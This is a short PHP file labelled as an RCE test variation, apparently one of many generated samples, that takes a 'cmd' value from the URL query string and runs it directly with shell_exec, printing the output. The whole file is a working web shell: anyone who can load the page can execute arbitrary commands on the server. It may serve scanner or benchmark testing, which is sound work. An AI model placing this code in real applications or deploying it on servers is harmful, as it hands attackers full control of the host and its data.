<?php
// RCE test variation #1478
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>